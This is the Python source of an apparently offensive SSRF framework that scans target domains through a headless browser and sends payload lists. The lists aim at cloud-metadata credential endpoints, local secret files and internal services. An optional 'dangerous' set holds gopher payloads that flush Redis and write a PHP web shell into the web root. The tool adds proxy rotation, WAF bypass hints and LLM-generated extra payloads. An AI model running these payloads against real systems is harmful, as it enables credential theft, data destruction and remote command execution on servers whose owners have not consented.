#!/usr/bin/env python3
import asyncio, json, random, re, urllib.parse, os, sys, socket, argparse, time
from dataclasses import dataclass, asdict
from datetime import datetime
from typing import List, Dict, Optional, Set, Tuple
from collections import defaultdict
from pathlib import Path
from playwright.async_api import async_playwright, Response, Page

try:
    import aiohttp
    AIOHTTP_AVAILABLE = True
except ImportError:
    AIOHTTP_AVAILABLE = False

try:
    from jinja2 import Template
    JINJA2_AVAILABLE = True
except ImportError:
    JINJA2_AVAILABLE = False

try:
    import yaml
    YAML_AVAILABLE = True
except ImportError:
    YAML_AVAILABLE = False

try:
    import networkx as nx
    NETWORKX_AVAILABLE = True
except ImportError:
    NETWORKX_AVAILABLE = False

RED = "\033[91m"; GREEN = "\033[92m"; YELLOW = "\033[93m"; BLUE = "\033[94m"
MAGENTA = "\033[95m"; CYAN = "\033[96m"; PURPLE = "\033[35m"; BOLD = "\033[1m"; DIM = "\033[2m"
RESET = "\033[0m"; OK = f"{GREEN}[OK]{RESET}"; WARN = f"{YELLOW}[!]{RESET}"; FAIL = f"{RED}[X]{RESET}"
AI_ICON = f"{PURPLE}[AI]{RESET}"

BANNER = f"""
{BOLD}{CYAN}
╔════════════════════════════════════════════════════════════════╗
║              ULTIMATE SSRF FRAMEWORK v4.2-experimental         ║
║     github.com/KauanCosta2000/Ultimate-ssrf-Framework          ║
║              Created by belladonnask                           ║
╚════════════════════════════════════════════════════════════════╝
{RESET}"""

DEFAULT_SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name",
    "http://169.254.169.254/latest/meta-data/public-keys/",
    "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
    "http://169.254.169.254/latest/dynamic/instance-identity/document",
    "http://169.254.169.254/latest/meta-data/services/domain",
    "http://169.254.169.254/latest/meta-data/network/interfaces/macs/",
    "http://[::ffff:169.254.169.254]/latest/meta-data/",
    "http://0x7f000001/",
    "http://2130706433/",
    "http://0254.0254.0169.0254/",
    "http://169.254.169.254.nip.io/latest/meta-data/",
    "http://1.0.0.127.bc.googleusercontent.com/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/",
    "http://metadata.google.internal/computeMetadata/v1/project/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://metadata.google.internal/0.1/meta-data/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    "http://169.254.169.254/metadata/identity/oauth2/token?resource=https://vault.azure.net",
    "http://100.100.100.200/latest/meta-data/",
    "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
    "http://169.254.169.254/metadata/v1.json",
    "http://169.254.169.254/metadata/v1/id",
    "http://169.254.169.254/opc/v2/instance/",
    "http://169.254.169.254/opc/v2/vnics/",
    "http://metadata.tencentyun.com/latest/meta-data/",
    "http://kubernetes.default.svc/api/v1/namespaces",
    "http://kubernetes.default.svc/apis/apps/v1/deployments",
    "http://169.254.169.254/latest/meta-data/kube-env/",
    "https://kubernetes.default.svc/metrics",
    "http://127.0.0.1/",
    "http://127.0.0.1:80/",
    "http://localhost/",
    "http://0.0.0.0/",
    "http://[::1]/",
    "http://0/",
    "http://0177.0.0.01/",
    "http://127.1/",
    "http://127.0.0.1.sslip.io/",
    "http://localtest.me/",
    "http://spoofed.burpcollaborator.net/",
    "http://127.0.0.1:16969/",
    "http://192.168.0.1/",
    "http://10.0.0.1/",
    "http://172.16.0.1/",
    "file:///etc/passwd",
    "file:///etc/hosts",
    "file:///proc/self/environ",
    "file:///proc/self/cmdline",
    "file:///proc/self/cwd/app.py",
    "file:///var/run/secrets/kubernetes.io/serviceaccount/token",
    "file:///c:/windows/win.ini",
    "file:///c:/windows/system32/drivers/etc/hosts",
    "gopher://127.0.0.1:6379/_INFO",
    "gopher://127.0.0.1:6379/_QUIT",
    "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a",
    "gopher://127.0.0.1:3306/_",
    "dict://127.0.0.1:6379/info",
    "dict://127.0.0.1:6379/config%20get%20*",
    "dict://127.0.0.1:11211/stats",
    "dict://127.0.0.1:22/",
    "ftp://127.0.0.1:21/",
    "ftp://attacker.com/",
    "ldap://127.0.0.1:389/",
    "ldap://attacker.com/",
    "sftp://127.0.0.1:22/",
    "http://1.0.0.127.nip.io/",
    "http://1.0.0.127.sslip.io/",
    "http://localtest.me/",
    "http://readme.localtest.me/",
    "http://burpcollaborator.net/",
    "http://metadata.nicob.net/",
    "http://metadata.nicob.net/latest/meta-data/",
    "http://127.0.0.1/%0d%0aX-Injected%3A%20true",
    "http://your-collaborator.com/redirect?url=http://169.254.169.254/",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "expect://id",
    "jar:file:///etc/passwd!/",
    "http://attacker.com/ssrf.svg",
]

DANGEROUS_SSRF_PAYLOADS = [
    "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
    "gopher://127.0.0.1:6379/_config%20set%20dir%20/var/www/html%0d%0aconfig%20set%20dbfilename%20shell.php%0d%0aset%20webshell%20%22%3C%3Fphp%20system($_GET['cmd'])%3B%20%3F%3E%22%0d%0asave%0d%0a",
    "gopher://127.0.0.1:6379/_config%20set%20dir%20/var/www/html%0d%0aconfig%20set%20dbfilename%20cmd.php%0d%0aset%20payload%20%22%3C%3Fphp%20system($_GET['cmd'])%3B%3F%3E%22%0d%0asave%0d%0a",
    "gopher://127.0.0.1:25/_EHLO%20localhost%0d%0aMAIL%20FROM%3A%3Ctest%40test.com%3E%0d%0aRCPT%20TO%3A%3Cvictim%40test.com%3E%0d%0aDATA%0d%0aSubject%3A%20SSRF%20test%0d%0a%0d%0aTest%20body%0d%0a.%0d%0aQUIT%0d%0a",
    "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushdb%0d%0a",
    "gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$1%0d%0a1%0d%0a",
]

@dataclass
class SSRFEvidence:
    phase: str; technique: str; url: str; endpoint: str; param: str
    payload: str; status: int; body_snippet: str; matched_patterns: List[str]
    severity: str = "info"; request_headers: Optional[Dict] = None
    response_headers: Optional[Dict] = None; out_of_band_hit: bool = False
    impact_score: float = 0.0

@dataclass
class DiscoveredEndpoint:
    path: str; method: str; params: Set[str]
    accepts_url_param: bool; test_response_code: int; content_type: str

@dataclass
class ScanAttempt:
    phase: str
    technique: str
    target: str
    tested_url: str
    endpoint: str
    param: str
    payload: str
    status: int
    vulnerable: bool = False
    result: str = "not_confirmed"
    severity: str = "info"
    confidence: str = "low"
    matched_patterns: Optional[List[str]] = None
    error: Optional[str] = None

def setup_argparse():
    parser = argparse.ArgumentParser(description="Ultimate SSRF Framework v4.2-experimental",
                                     formatter_class=argparse.RawDescriptionHelpFormatter)
    target_group = parser.add_mutually_exclusive_group()
    target_group.add_argument("--target", "-t", help="Single target domain")
    target_group.add_argument("--targets", help="Comma-separated targets")
    target_group.add_argument("--target-file", "-f", help="File with targets (one per line)")
    parser.add_argument("--callback", "-c", help="OOB callback host")
    parser.add_argument("--collaborator", help="OAST-compatible callback host (alias for --callback)")
    parser.add_argument("--burp-collaborator", help="Burp Collaborator host")
    parser.add_argument("--delay", "-d", type=float, default=0.5)
    parser.add_argument("--quiet", "-q", action="store_true")
    parser.add_argument("--visible", action="store_true")
    proxy_group = parser.add_argument_group("Proxy Support")
    proxy_group.add_argument("--proxy", "-p", help="Single proxy URL (used for the entire scan)")
    proxy_group.add_argument("--proxy-file", help="File with proxy list (one proxy per scan)")
    proxy_group.add_argument("--proxy-type", choices=["http","socks5"], default="http")
    ai_group = parser.add_argument_group("AI Integration (Optional)")
    ai_group.add_argument("--ai-provider", choices=["claude","openai","ollama","gemini","mistral","deepseek","sheep","none"])
    ai_group.add_argument("--ai-key", help="API key or provider token. Sheep can also use SHEEP_TOKEN or SHEEP_API_TOKEN")
    ai_group.add_argument("--ai-model", help="Specific model name")
    feature_group = parser.add_argument_group("Feature Control")
    feature_group.add_argument("--no-waf", action="store_true", help="Disable WAF detection")
    feature_group.add_argument("--no-websocket", action="store_true", help="Disable WebSocket SSRF tests")
    feature_group.add_argument("--no-grpc", action="store_true", help="Disable gRPC SSRF tests")
    feature_group.add_argument("--no-k8s", action="store_true", help="Disable Kubernetes SSRF tests")
    feature_group.add_argument("--no-serverless", action="store_true", help="Disable serverless SSRF tests")
    feature_group.add_argument("--no-ai", action="store_true", help="Disable AI features")
    feature_group.add_argument("--dangerous-payloads", action="store_true",
                               help="Enable dangerous/destructive SSRF payloads (e.g., Redis flush, SMTP DATA)")
    export_group = parser.add_argument_group("Export Options (experimental)")
    export_group.add_argument("--export-nuclei", action="store_true", help="Export Nuclei templates (YAML if PyYAML installed)")
    export_group.add_argument("--export-siem", action="store_true", help="Export CEF for SIEM")
    export_group.add_argument("--export-json-api", action="store_true", help="Export JSON API report")
    export_group.add_argument("--attack-map", action="store_true", help="Generate attack path graph (requires networkx)")
    export_group.add_argument("--output", "-o", default=".", help="Output directory")
    return parser

class TargetManager:
    @staticmethod
    def from_args(args) -> List[str]:
        if args.target:
            c = TargetManager._clean(args.target)
            return [c] if c else []
        if args.targets:
            return [d for d in (TargetManager._clean(x) for x in args.targets.split(',')) if d]
        if args.target_file:
            return TargetManager._from_file(args.target_file)
        return []

    @staticmethod
    def _clean(domain: str) -> Optional[str]:
        d = domain.strip()
        if not d: return None
        d = re.sub(r'^https?://', '', d).split('/')[0]
        return d

    @staticmethod
    def _from_file(path: str) -> List[str]:
        targets = []
        try:
            with open(path) as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        c = TargetManager._clean(line)
                        if c: targets.append(c)
        except Exception as e:
            print(f"{FAIL} Error reading target file '{path}': {e}")
            sys.exit(1)
        return targets

    @staticmethod
    def interactive() -> List[str]:
        print(f"\n{BOLD}{CYAN}TARGET SELECTION{RESET}")
        print(f"  1 - Single domain")
        print(f"  2 - Multiple (comma)")
        print(f"  3 - File")
        while True:
            ch = input(f"{WARN} Choose [1/2/3]: ").strip()
            if ch == "1":
                t = [TargetManager._clean(input("Domain: "))]
                return [x for x in t if x]
            if ch == "2":
                doms = input("Domains (comma): ")
                return [d for d in (TargetManager._clean(x) for x in doms.split(',')) if d]
            if ch == "3":
                return TargetManager._from_file(input("File path: ").strip())
            print(f"{FAIL} Invalid option")

class ProxyManager:
    def __init__(self, proxy_list: List[str] = None, proxy_type: str = "http"):
        self.list = proxy_list or []
        self.ptype = proxy_type
        self.idx = 0
        self.lock = asyncio.Lock()

    @classmethod
    def from_file(cls, path: str, ptype="http") -> "ProxyManager":
        proxies = []
        try:
            with open(path) as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        proxies.append(line)
        except Exception as e:
            print(f"{FAIL} Error reading proxy file '{path}': {e}")
            sys.exit(1)
        return cls(proxies, ptype)

    async def pick(self) -> Optional[str]:
        if not self.list: return None
        async with self.lock:
            p = self.list[self.idx % len(self.list)]
            self.idx += 1
            return p

SHEEP_BASE_URL = "https://sheep.byfranke.com"
SHEEP_MAX_ATTEMPTS = 3
SHEEP_TIMEOUT = 45
SHEEP_MODELS = {"auto", "scout", "hunter", "sage"}


def redact_secret(value: str) -> str:
    if not value:
        return value
    return re.sub(r'shp_[A-Za-z0-9_=-]+', 'shp_[REDACTED]', str(value))


class SheepAPIError(Exception):
    pass

class LLMClient:
    MODELS = {
        "claude": "claude-3-5-sonnet-20241022",
        "openai": "gpt-4o",
        "ollama": "llama3.1:latest",
        "gemini": "gemini-2.0-flash-exp",
        "mistral": "mistral-large-latest",
        "deepseek": "deepseek-chat",
        "sheep": "auto",
    }

    def __init__(self, provider=None, api_key=None, model=None):
        self.provider = provider
        self.api_key = api_key
        self.model = model or self.MODELS.get(provider)
        self.enabled = False
        self.last_usage = {}
        self.last_error = None

        if not provider or provider == "none" or not AIOHTTP_AVAILABLE:
            return

        if provider == "sheep":
            self.api_key = api_key or os.environ.get("SHEEP_TOKEN") or os.environ.get("SHEEP_API_TOKEN")
            self.model = self.model if self.model in SHEEP_MODELS else "auto"
            if self.api_key:
                self.enabled = True
            else:
                print(f"{WARN} Sheep API token missing. Use --ai-key, SHEEP_TOKEN or SHEEP_API_TOKEN")
            return

        if provider == "ollama":
            try:
                s = socket.socket()
                s.settimeout(1)
                s.connect(("localhost", 11434))
                s.close()
                self.enabled = True
            except Exception:
                print(f"{WARN} Ollama not reachable")
            return

        if api_key:
            self.enabled = True
        else:
            print(f"{WARN} No API key for {provider}")

    async def generate(self, sys_msg: str, usr_msg: str) -> Optional[str]:
        if not self.enabled:
            return None

        try:
            if self.provider == "claude":
                return await self._claude(sys_msg, usr_msg)
            if self.provider == "gemini":
                return await self._gemini(sys_msg, usr_msg)
            if self.provider == "ollama":
                return await self._ollama(sys_msg, usr_msg)
            if self.provider == "sheep":
                return await self._sheep(sys_msg, usr_msg)
            return await self._openai_compat(sys_msg, usr_msg)
        except Exception as e:
            self.last_error = redact_secret(str(e))
            print(f"{WARN} LLM error: {self.last_error}")
            return None

    async def _claude(self, sys_msg, usr_msg):
        headers = {"x-api-key": self.api_key, "anthropic-version": "2023-06-01", "content-type": "application/json"}
        body = {"model": self.model, "max_tokens": 4096, "system": sys_msg, "messages": [{"role":"user","content":usr_msg}]}
        async with aiohttp.ClientSession() as s:
            async with s.post("https://api.anthropic.com/v1/messages", headers=headers, json=body, timeout=60) as r:
                data = await r.json()
                return data.get("content",[{}])[0].get("text","")

    async def _openai_compat(self, sys_msg, usr_msg):
        urls = {"openai":"https://api.openai.com/v1/chat/completions",
                "mistral":"https://api.mistral.ai/v1/chat/completions",
                "deepseek":"https://api.deepseek.com/v1/chat/completions"}
        headers = {"Authorization": f"Bearer {self.api_key}", "Content-Type": "application/json"}
        body = {"model": self.model, "messages": [{"role":"system","content":sys_msg},{"role":"user","content":usr_msg}], "max_tokens":4096}
        url = urls.get(self.provider, urls["openai"])
        async with aiohttp.ClientSession() as s:
            async with s.post(url, headers=headers, json=body, timeout=60) as r:
                data = await r.json()
                return data.get("choices",[{}])[0].get("message",{}).get("content","")

    async def _gemini(self, sys_msg, usr_msg):
        url = f"https://generativelanguage.googleapis.com/v1beta/models/{self.model}:generateContent?key={self.api_key}"
        body = {"contents":[{"parts":[{"text":f"{sys_msg}\n\n{usr_msg}"}]}]}
        async with aiohttp.ClientSession() as s:
            async with s.post(url, json=body, timeout=60) as r:
                data = await r.json()
                return data.get("candidates",[{}])[0].get("content",{}).get("parts",[{}])[0].get("text","")

    async def _ollama(self, sys_msg, usr_msg):
        body = {"model": self.model, "prompt": f"System: {sys_msg}\n\nUser: {usr_msg}\n\nAssistant:", "stream": False}
        async with aiohttp.ClientSession() as s:
            async with s.post("http://localhost:11434/api/generate", json=body, timeout=120) as r:
                data = await r.json()
                return data.get("response","")

    async def _sheep(self, sys_msg, usr_msg):
        model = self.model if self.model in SHEEP_MODELS else "auto"
        payload = {"question": f"{sys_msg}\n\n{usr_msg}", "model": model}
        headers = {
            "X-Sheep-Token": self.api_key,
            "Content-Type": "application/json",
            "User-Agent": "ultimate-ssrf-framework/4.2-experimental",
        }
        timeout = aiohttp.ClientTimeout(total=SHEEP_TIMEOUT)

        for attempt in range(SHEEP_MAX_ATTEMPTS):
            try:
                async with aiohttp.ClientSession(timeout=timeout) as session:
                    async with session.post(f"{SHEEP_BASE_URL}/api/ai/ask", headers=headers, json=payload) as response:
                        try:
                            data = await response.json()
                        except Exception:
                            data = {"text": await response.text()}

                        if response.status == 200:
                            self.last_error = None
                            self.last_usage = {
                                "provider": "sheep",
                                "model_requested": model,
                                "served_by": data.get("served_by") if isinstance(data, dict) else None,
                                "tokens_used": data.get("tokens_used") if isinstance(data, dict) else None,
                                "rate_limit_remaining": response.headers.get("X-RateLimit-Remaining"),
                            }
                            if isinstance(data, dict):
                                for key in ("response", "answer", "content", "text", "result", "message"):
                                    value = data.get(key)
                                    if isinstance(value, str) and value.strip():
                                        return value
                                return json.dumps(data, ensure_ascii=False)
                            return str(data)

                        if response.status == 429:
                            retry_after = response.headers.get("Retry-After", "10")
                            try:
                                wait_time = int(retry_after)
                            except ValueError:
                                wait_time = 10
                            if attempt < SHEEP_MAX_ATTEMPTS - 1:
                                print(f"{WARN} Sheep rate limited. Retrying in {wait_time}s")
                                await asyncio.sleep(wait_time)
                                continue

                        if 500 <= response.status < 600:
                            wait_time = 2 ** attempt
                            if attempt < SHEEP_MAX_ATTEMPTS - 1:
                                print(f"{WARN} Sheep temporary error {response.status}. Retrying in {wait_time}s")
                                await asyncio.sleep(wait_time)
                                continue

                        detail = data.get("detail", {}) if isinstance(data, dict) else {}
                        error_code = None
                        error_message = None
                        if isinstance(detail, dict):
                            error_code = detail.get("error")
                            error_message = detail.get("message")
                        if isinstance(data, dict):
                            error_code = error_code or data.get("error")
                            error_message = error_message or data.get("message")

                        if response.status == 401:
                            raise SheepAPIError("Sheep API authentication failed. Check your token")
                        if response.status == 402:
                            raise SheepAPIError("Sheep API quota exhausted or subscription inactive")
                        if response.status == 403:
                            raise SheepAPIError(f"Sheep model '{model}' is not available for this token/plan")
                        if response.status == 429:
                            raise SheepAPIError("Sheep API rate limit exceeded after retries")

                        raise SheepAPIError(f"Sheep API error {response.status}: {error_code or 'unknown'} - {error_message or 'no message'}")

            except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                if attempt < SHEEP_MAX_ATTEMPTS - 1:
                    wait_time = 2 ** attempt
                    print(f"{WARN} Sheep connection error. Retrying in {wait_time}s")
                    await asyncio.sleep(wait_time)
                    continue
                raise SheepAPIError(f"Sheep request failed: {redact_secret(str(e))}")

        raise SheepAPIError("Sheep request failed after retries")

class AISkills:
    def __init__(self, llm, dangerous_payloads: bool = False):
        self.llm = llm
        self.enabled = llm and llm.enabled
        self.dangerous = dangerous_payloads
        self.last_llm_payloads = []

    async def generate_payloads(self, context: dict) -> List[str]:
        sys = (
            "You are helping an authorized security testing tool generate SSRF test payloads. "
            "Return only a JSON array of strings. "
            "Generate safe, non-destructive SSRF payloads focused on detection and validation. "
            "Prefer callback/OAST, cloud metadata read-only probes, localhost variants, URL parser bypasses, "
            "DNS helper domains, redirects, encoded URL forms, IPv6/decimal/octal forms, and scheme confusion checks. "
            "Do not generate destructive payloads, Redis writes, SMTP DATA payloads, command execution payloads, web shells, "
            "data deletion payloads, credential theft instructions, persistence, or malware. "
            "Do not include explanations. Return JSON only."
        )
        usr = (
            f"Target: {context.get('target')}\n"
            f"WAF: {context.get('waf', 'none')}\n"
            f"Cloud: {context.get('cloud', 'unknown')}\n"
            f"Callback host: {context.get('callback_host', '')}\n"
            f"Endpoints: {json.dumps(context.get('endpoints', []), ensure_ascii=False)}\n"
            f"Parameters: {json.dumps(context.get('params', []), ensure_ascii=False)}\n"
            "Generate 10 safe SSRF payloads."
        )
        resp = await self.llm.generate(sys, usr)
        llm_payloads = []

        if resp:
            try:
                match = re.search(r'\[.*\]', resp, re.DOTALL)
                if match:
                    parsed = json.loads(match.group())
                    if isinstance(parsed, list):
                        llm_payloads = [
                            str(item).strip()
                            for item in parsed
                            if str(item).strip()
                        ]
            except Exception:
                pass

        self.last_llm_payloads = llm_payloads
        combined = DEFAULT_SSRF_PAYLOADS.copy()

        if self.dangerous:
            combined.extend(DANGEROUS_SSRF_PAYLOADS)

        for payload in llm_payloads:
            if payload not in combined:
                combined.append(payload)

        return combined[:40]

    async def suggest_additional_tests(self, context: dict) -> List[dict]:
        sys = (
            "You are assisting an authorized web security scanner. "
            "Suggest safe, non-destructive validation checks based on discovered endpoints and parameters. "
            "Return only a JSON array of objects. "
            "Allowed issue_type values: ssrf, open_redirect, cors_misconfig, header_injection, "
            "path_traversal_readonly, information_disclosure, authz_review. "
            "Do not suggest destructive tests, brute force, credential attacks, data modification, account takeover steps, "
            "command execution, web shells, persistence, malware, or exfiltration. "
            "Each object must contain: issue_type, endpoint, param, reason, safe_test_value. "
            "Use safe_test_value only for benign validation strings or callback URLs. Return JSON only."
        )
        usr = json.dumps(
            {
                "target": context.get("target"),
                "callback_host": context.get("callback_host"),
                "endpoints": context.get("endpoints", []),
                "params": context.get("params", []),
                "waf": context.get("waf"),
                "cloud": context.get("cloud"),
            },
            indent=2,
            ensure_ascii=False,
        )
        resp = await self.llm.generate(sys, usr)
        if not resp:
            return []

        try:
            match = re.search(r'\[.*\]', resp, re.DOTALL)
            if not match:
                return []
            parsed = json.loads(match.group())
            if not isinstance(parsed, list):
                return []

            allowed = {
                "ssrf",
                "open_redirect",
                "cors_misconfig",
                "header_injection",
                "path_traversal_readonly",
                "information_disclosure",
                "authz_review",
            }
            suggestions = []

            for item in parsed[:15]:
                if not isinstance(item, dict):
                    continue

                issue_type = str(item.get("issue_type", "")).strip().lower()
                endpoint = str(item.get("endpoint", "")).strip()
                param = str(item.get("param", "")).strip()
                reason = str(item.get("reason", "")).strip()
                safe_test_value = str(item.get("safe_test_value", "")).strip()

                if issue_type not in allowed:
                    continue
                if not endpoint.startswith("/"):
                    continue
                if not param:
                    continue

                suggestions.append(
                    {
                        "issue_type": issue_type,
                        "endpoint": endpoint,
                        "param": param,
                        "reason": reason,
                        "safe_test_value": safe_test_value,
                    }
                )

            return suggestions

        except Exception:
            return []

    async def triage(self, findings: List[dict]) -> Optional[str]:
        sys = (
            "You are a senior security analyst reviewing authorized web security scan results. "
            "Separate confirmed vulnerable items, suspected_other_issue items, manual_review items, not_confirmed attempts and errors. "
            "For confirmed SSRF issues, mention endpoint, parameter, payload, evidence, severity and recommended next steps. "
            "For suspected non-SSRF issues, clearly label them as suspected and requiring manual validation. "
            "Never claim a target is safe when the result is only not_confirmed."
        )
        usr = json.dumps(findings[:40], indent=2, ensure_ascii=False)
        return await self.llm.generate(sys, usr)

class WAFFingerprinter:
    SIGNATURES = {
        "Cloudflare": {"headers":["cf-ray","__cfduid"],"cookies":["__cfduid","cf_clearance"],"body":["cloudflare"]},
        "AWS WAF": {"headers":["x-amz-cf-id","x-amzn-requestid"],"cookies":[],"body":["request blocked"]},
        "Akamai": {"headers":["x-akamai-transformed"],"cookies":["ak_bmsc"],"body":["akamai"]},
        "Imperva": {"headers":["x-cdn","x-iinfo"],"cookies":["incap_ses_","visid_incap_"],"body":["incapsula"]},
        "F5 BIG-IP": {"headers":["x-wa-info"],"cookies":["f5avr"],"body":["f5 networks"]},
        "Sucuri": {"headers":["x-sucuri-id"],"cookies":["sucuri_cloudproxy_uuid"],"body":["sucuri"]},
        "Fastly": {"headers":["fastly-debug-digest","x-served-by"],"cookies":[],"body":["fastly"]},
        "Azure Front Door": {"headers":["x-azure-ref","x-ms-request-id"],"cookies":[],"body":["azure"]},
        "Google Cloud Armor": {"headers":[],"cookies":[],"body":["google cloud armor"]},
        "FortiWeb": {"headers":[],"cookies":["fortiwafsid"],"body":["fortiweb"]},
    }
    BYPASS = {
        "Cloudflare":["DNS rebinding","IPv6 notation"],
        "AWS WAF":["IMDSv1 downgrade","Alternative metadata IPs"],
        "Imperva":["Double URL encoding","gopher:// protocol"],
        "Akamai":["Origin IP discovery","DNS pinning"],
    }
    def fingerprint(self, headers, body, cookies=None):
        cookies = cookies or {}
        headers_lower = {k.lower(): str(v).lower() for k,v in headers.items()}
        body_lower = body.lower()[:10000]
        cookie_keys = [k.lower() for k in cookies]
        results = {}
        for waf, sigs in self.SIGNATURES.items():
            score = 0; max_score = 0
            for h in sigs["headers"]:
                max_score += 2
                if any(h.lower() in hk for hk in headers_lower): score += 2
            for c in sigs["cookies"]:
                max_score += 2
                if any(c.lower() in ck for ck in cookie_keys): score += 2
            for b in sigs["body"]:
                max_score += 1
                if b in body_lower: score += 1
            if max_score > 0:
                confidence = (score/max_score)*100
                if confidence >= 20: results[waf] = confidence
        sorted_results = sorted(results.items(), key=lambda x: x[1], reverse=True)
        if sorted_results:
            return {"detected":True,"primary":sorted_results[0][0],"confidence":sorted_results[0][1],
                    "all_matches":dict(sorted_results[:3]),
                    "bypass_suggestions":self.BYPASS.get(sorted_results[0][0],[])}
        return {"detected":False,"primary":None,"confidence":0}

class UltimateSSRFFramework:
    def __init__(self, target, args):
        self.target = target
        self.base = f"https://{target}" if not target.startswith("http") else target
        self.cb = (
            args.callback
            or args.collaborator
            or args.burp_collaborator
            or f"{target}.ssrf-test.local"
        )
        self.delay = args.delay
        self.verbose = not args.quiet
        self.headless = not args.visible
        self.proxy = args.proxy
        self.proxy_file = args.proxy_file
        self.proxy_type = args.proxy_type
        self.no_waf = args.no_waf
        self.no_ws = args.no_websocket
        self.no_grpc = args.no_grpc
        self.no_k8s = args.no_k8s
        self.no_serverless = args.no_serverless
        self.no_ai = args.no_ai
        self.dangerous_payloads = args.dangerous_payloads
        self.do_export_nuclei = args.export_nuclei
        self.do_export_siem = args.export_siem
        self.do_export_json_api = args.export_json_api
        self.do_attack_map = args.attack_map

        self.output_dir = Path(args.output)
        self.output_dir.mkdir(parents=True, exist_ok=True)

        self.llm = None; self.ai = None
        if args.ai_provider and args.ai_provider != "none" and not self.no_ai:
            self.llm = LLMClient(args.ai_provider, args.ai_key, args.ai_model)
            if self.llm.enabled:
                self.ai = AISkills(self.llm, dangerous_payloads=args.dangerous_payloads)

        self.evidence: List[SSRFEvidence] = []
        self.scan_attempts: List[ScanAttempt] = []
        self.ai_suggestions = []
        self.other_issue_attempts = []
        self.endpoints: List[DiscoveredEndpoint] = []
        self.params: Set[str] = set()
        self.callbacks = defaultdict(list)
        self.callback_context = {}
        self.waf_info = {}
        self.cloud = []
        self.internal_ips = set()

        self.proxy_mgr = None
        if args.proxy_file:
            self.proxy_mgr = ProxyManager.from_file(args.proxy_file, args.proxy_type)
        elif args.proxy:
            self.proxy_mgr = ProxyManager([args.proxy], args.proxy_type)

        self.waf = WAFFingerprinter()
        self.playwright = None; self.browser = None; self.page = None
        self.sem = asyncio.Semaphore(15)

        safe = re.sub(r'[^a-zA-Z0-9.-]', '_', target)
        ts = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.json_file = self.output_dir / f"ssrf_{safe}_{ts}.json"
        self.html_file = self.output_dir / f"ssrf_report_{safe}_{ts}.html"

    async def start(self):
        self.playwright = await async_playwright().start()
        launch_opts = {"headless": self.headless}
        if self.proxy_mgr:
            p = await self.proxy_mgr.pick()
            if p:
                launch_opts["proxy"] = {"server": p}
                if self.verbose: print(f"{CYAN}[PROXY]{RESET} {p}")
        self.browser = await self.playwright.chromium.launch(**launch_opts)
        ctx = await self.browser.new_context(user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        await ctx.route("**/*", self._intercept)
        self.page = await ctx.new_page()

    async def stop(self):
        if self.browser: await self.browser.close()
        if self.playwright: await self.playwright.stop()

    async def _intercept(self, route):
        req = route.request
        url = req.url

        try:
            parsed = urllib.parse.urlparse(url)
            req_host = (parsed.hostname or "").lower()
            cb_host = self._callback_host()

            if cb_host and req_host.endswith(cb_host):
                ctx = self._find_callback_context(req_host)
                ev = SSRFEvidence(
                    phase=ctx.get("phase", "BLIND_SSRF"),
                    technique=ctx.get("technique", "OOB Callback"),
                    url=url,
                    endpoint=ctx.get("endpoint", "unknown"),
                    param=ctx.get("param", "callback"),
                    payload=ctx.get("payload", url),
                    status=200,
                    body_snippet="",
                    matched_patterns=["[CRITICAL] OOB callback host requested"],
                    severity="critical",
                    out_of_band_hit=True
                )
                ev.impact_score = self._impact(ev)
                self.evidence.append(ev)
                self.scan_attempts.append(
                    ScanAttempt(
                        phase=ev.phase,
                        technique=ev.technique,
                        target=self.target,
                        tested_url=url,
                        endpoint=ev.endpoint,
                        param=ev.param,
                        payload=ev.payload,
                        status=200,
                        vulnerable=True,
                        result="vulnerable",
                        severity=ev.severity,
                        confidence="high",
                        matched_patterns=ev.matched_patterns,
                    )
                )
                self.callbacks[req_host].append({
                    "time": datetime.now().isoformat(),
                    "method": req.method,
                    "url": url,
                    "endpoint": ev.endpoint,
                    "param": ev.param,
                    "payload": ev.payload,
                })
        except Exception:
            pass

        await route.continue_()

    async def request(self, method, url, data=None, headers=None, timeout=15000):
        async with self.sem:
            try:
                safe_url = json.dumps(url)
                if method.upper() == "GET":
                    resp = await self.page.goto(url, wait_until="domcontentloaded", timeout=timeout)
                    status = resp.status if resp else 0
                    body = await resp.text() if resp else ""
                    hdrs = dict(resp.headers) if resp else {}
                else:
                    js = f"""
                    (async () => {{
                        const r = await fetch({safe_url}, {{
                            method: '{method}',
                            headers: {json.dumps(headers or {})},
                            body: {json.dumps(json.dumps(data) if data else "")}
                        }});
                        return {{ status: r.status, body: await r.text(), headers: Object.fromEntries(r.headers) }};
                    }})();
                    """
                    result = await self.page.evaluate(js)
                    status = result.get("status", 0)
                    body = result.get("body", "")
                    hdrs = result.get("headers", {})
                await asyncio.sleep(self.delay)
                return status, body, hdrs
            except Exception as e:
                return 0, "", {"_error": str(e)}

    async def check_evidence(self, phase, technique, url, endpoint, param, payload, status, body, headers):
        patterns = [
            (r'root:[^:]+:[0-9]+:[0-9]+:', '/etc/passwd', 'critical'),
            (r'AKIA[0-9A-Z]{16}', 'AWS key', 'critical'),
            (r'computeMetadata|metadata\.google\.internal', 'Cloud metadata', 'high'),
            (r'169\.254\.\d{1,3}\.\d{1,3}', 'Cloud metadata IP', 'high'),
            (r'10\.\d{1,3}\.\d{1,3}\.\d{1,3}', 'Internal IP', 'high'),
